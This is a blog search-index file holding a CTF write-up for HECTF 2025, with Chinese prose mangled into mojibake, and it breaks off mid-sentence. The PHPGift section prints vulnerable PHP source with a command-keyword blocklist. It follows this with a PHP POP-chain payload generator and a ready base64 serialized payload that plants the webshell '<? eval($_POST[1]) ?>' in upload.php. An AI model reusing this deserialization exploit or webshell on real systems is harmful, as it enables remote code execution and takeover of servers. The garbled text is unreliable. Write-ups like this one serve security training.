<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€2025ã€‘HECTF</title>
      <link href="/posts/215f7d8b.html"/>
      <url>/posts/215f7d8b.html</url>
      
        <content type="html"><![CDATA[<pre><code>ç¬¬ä¸€å¤©æ‰“å¾—å¤´ç–¼çœ¼ç›ç–¼ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¢«è„‘æ´ç»™å¹²çƒ‚äº†ï¼Œç»“æœæ˜¯tmæ„Ÿå†’äº†ï¼Œå›å»åƒä¸ªè¯ç§’å¥½äº†ï¼Œä½†æ˜¯è„‘æ´å¤ªéš¾èšŒäº†ï¼Œç¬¬äºŒå¤©æ‰“èˆèŒå»äº†ï¼Œæ²¡è§£åé¢çš„é¢˜äº†ï¼Œä¸è¿‡å¹¸å¥½æ²¡çœ‹ï¼Œåé¢æœ‰äº›é¢˜è¿˜çœŸä¸å¤§å¥½å†™ã€‚</code></pre><h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h1><h2 id="è€çˆ·çˆ·çš„é‡‘å—"><a class="markdownIt-Anchor" href="#è€çˆ·çˆ·çš„é‡‘å—">#</a> <strong>è€çˆ·çˆ·çš„é‡‘å—</strong></h2><blockquote><p>ç°åœ¨ä¸çŸ¥ä¸è§‰ 2025 å¹´äº†ï¼Œæ›¾ç»åœ¨ 4399 é‡Œé¨æ¸¸çš„å°å­©å„¿ä¹Ÿå˜æˆå¤§äººäº†â€¦ é‡æ–°çœ‹äº†ä¸€é 4399 çš„ç»å…¸æ¸¸æˆï¼Œæƒ³èµ·äº†è¿™ä¸ªåŠªåŠ›æŒ–çŸ¿çš„è€çˆ·çˆ·ã€‚ ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€ exeï¼Œé‡æ¸©ç«¥å¹´çš„ä¹è¶£ï¼</p><p><strong>æç¤º 1</strong>1. è¯·æ³¨æ„è·å¾—çš„ flag ç¬¬å…­æ®µå‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼å“¦ï½</p></blockquote><p>â€‹ æ‰“å¼€æ˜¯ä¸ªæ¸¸æˆï¼Œæ‰“å®Œå°±æœ‰ flagï¼Œå½“ç„¶åˆ†æ•°è¦è¿‡ 1000<br><img data-src="https://i-blog.csdnimg.cn/direct/761a2f79d1814c4e8f2c958d2bd43b70.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¦å¤–ä¸€ä¸ªæƒ³æ³•ï¼Œå°±æ˜¯ï¼Œæµè§ˆæ–‡ä»¶ï¼Œå‘ç° bk_flag.png ç­‰å¤šä¸ªå›¾ç‰‡ï¼Œwinhex æ‰“å¼€ï¼Œæœç´¢ flagï¼Œä¸çŸ¥é“ä¸ºå•¥ IDA é‡Œæ²¡æœ‰ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/51c9a624a8184b109669b285687065f2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æŠŠè¿™ä¸ªäº¤ä¸Šå»çœ‹çœ‹ï¼ŒæˆåŠŸã€‚</p><h2 id="phpgift"><a class="markdownIt-Anchor" href="#phpgift">#</a> <strong>PHPGift</strong></h2><p>â€‹ctrl+u çœ‹åˆ°ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hhhhhh!!!! where is xxx.php --&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æç¤ºæ˜¯ä¸‰å­—æ–‡ä»¶ï¼Œflag ä¸Šé¢æœ‰ä¸ª ser æ˜¯å”¯ä¸€ä¸‰å­—ç¬¦çš„è¯»è¯»çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/7513e1f76e20416796b6959d6edd04ec.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fileName</span> = <span class="string">&#x27;data.txt&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileName = <span class="variable">$fileName</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileHandle = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fileHandle) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;fileHandle);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fileName; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$settings</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;settings[<span class="variable">$key</span>] = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySessionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;sess_&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$userData</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;params) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;data) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data) === <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cacheDir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ttl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span> = <span class="string">&#x27;/tmp/cache&#x27;</span>, <span class="variable">$ttl</span> = <span class="number">3600</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cacheDir = <span class="variable">$dir</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ttl = <span class="variable">$ttl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;[Cache] Destroyed manager for <span class="subst">&#123;$this-&gt;cacheDir&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;app.log&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setLogFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$message</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="variable">$msg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User: <span class="subst">&#123;$this-&gt;name&#125;</span> (<span class="subst">&#123;$this-&gt;email&#125;</span>)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$factor</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$x</span> * <span class="variable language_">$this</span>-&gt;factor; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|sh|exec|system|passthru|`|eval|assert/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker?\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹pop é“¾ã€‚</p><p>â€‹é“¾å­æ€è·¯å¤§æ¦‚æ˜¯ <code>Logger</code>  ä¸­çš„ <code>__invoke</code> ï¼Œè§¦å‘ä¹‹åè°ƒç”¨ <code>log</code>  è¿›è¡Œä»»æ„æ–‡ä»¶å†™ï¼Œåœ¨è¿™é‡Œå†™å…¥æœ¨é©¬å³å¯ï¼Œé‚£ä¹ˆè°ƒç”¨ <code>__invoke</code>  çš„ç‚¹å¯ä»¥æ˜¯ <code>User</code>  ä¸­çš„ <code>call_user_func</code> ï¼Œ <code>__toString</code>  å¯ä»¥ç”± <code>FileHandler</code>  ä¸­çš„ <code>echo $this-&gt;fileName; </code> è§¦å‘ï¼Œå†å‘ä¸Šå°±æ˜¯ <code>__destruct</code> ï¼Œå…¶ä»–æ‚ä¸ƒæ‚å…«çš„ç±»å’Œæ–¹æ³•å¤ªå¤šäº†ï¼Œçœ‹ä¸Šå»è¿™ä¸ªé¢˜éš¾ï¼Œç»“æœä¸€çœ‹å¥½åƒä¸éš¾ï¼Œç”Ÿæˆ payload å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userData</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span> = <span class="string">&#x27;&lt;? eval($_POST[1]) ?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>=<span class="string">&quot;upload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fileName-&gt;data = [<span class="variable">$logger</span>,<span class="string">&quot;__invoke&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#TzoxMToiRmlsZUhhbmRsZXIiOjI6e3M6MTA6ImZpbGVIYW5kbGUiO047czo4OiJmaWxlTmFtZSI7Tzo0OiJVc2VyIjozOntzOjg6InVzZXJEYXRhIjtOO3M6NDoiZGF0YSI7YToyOntpOjA7Tzo2OiJMb2dnZXIiOjE6e3M6NzoibG9nRmlsZSI7czoxMDoidXBsb2FkLnBocCI7fWk6MTtzOjg6Il9faW52b2tlIjt9czo2OiJwYXJhbXMiO3M6MjE6Ijw/IGV2YWwoJF9QT1NUWzFdKSA/PiI7fX0=</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® <code>upload.php</code>  æ‹¿åˆ° shellï¼Œä¼ å‚æ˜¯ 1ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/641775d3f4a948c7bb1421efb6a55750.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹base64 è§£ç å¾—åˆ°ï¼š <code>HECTF&#123;c0ngr4ts_l1ttl3_h4ck3r_y0u_f0und_my_53cr3t_g1ft&#125;</code></p><h2 id="åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—"><a class="markdownIt-Anchor" href="#åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—">#</a> <strong>åƒç´ å‹‡è€…å’Œç¥ç§˜å®è—</strong></h2><p>â€‹ä¸‰ä¸ªé—¨ï¼Œæœ‰ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> courage = <span class="number">0</span>; <span class="comment">// åˆå§‹å‹‡æ°”å€¼</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateDisplay</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;courage-display&#x27;</span>).<span class="property">textContent</span> = courage;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">buyPotion</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            courage += <span class="number">50</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">door</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (door === <span class="string">&#x27;A&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (courage &lt; <span class="number">10000</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;âš ï¸ å‹‡æ°”ä¸è¶³ï¼éœ€è¦è‡³å°‘ 10000 ç‚¹æ‰èƒ½æŒ‘æˆ˜ Door Aï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// æ‰£é™¤ 5000 å‹‡æ°”</span></span></span><br><span class="line"><span class="language-javascript">                courage -= <span class="number">5000</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;/enter&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="string">`door=<span class="subst">$&#123;door&#125;</span>&amp;courage=<span class="subst">$&#123;courage&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">msg</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/victory?flag=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data.<span class="property">flag</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&#x27;è¯·æ±‚å¤±è´¥&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">updateDisplay</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    A: ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿæˆ‘ä»¬æ˜¯ä¸æ˜¯å¥½å…„å¼Ÿï¼Œä½ èƒŒç€æˆ‘å·å·æ‰“ä»€ä¹ˆæ¯”èµ›ï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="comment">    B: æ²¡æœ‰å•¦ï¼Œä½ è¦æ‰“å—ï¼ŒHECTFï¼Œæ¥ç©å§ã€‚</span></span><br><span class="line"><span class="comment">    A: å¯ä»¥å•Šï¼å¤Ÿå…„å¼Ÿçš„ï¼ŒHECTFæ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œæˆ‘å»æœæœã€‚</span></span><br><span class="line"><span class="comment">    B: å˜¿å˜¿ï¼Œè¿™æ˜¯ç§˜å¯†ï¼Œä½ è¯•è¯•å°±çŸ¥é“å•¦ã€‚</span></span><br><span class="line"><span class="comment">    A: è¡Œå§ï¼Œä½ çœŸè®¨åŒã€‚</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç¬¬ä¸€ä¸ªé—¨å°±æ­£å¸¸æŒ‰æŒ‰é¼ æ ‡å°±å¼€äº†ï¼Œå¤šç‚¹å¾ˆå¤šæ¬¡è€Œå·²ï¼Œç¬¬äºŒä¸ªé—¨æ˜¯åªæœ‰ vip 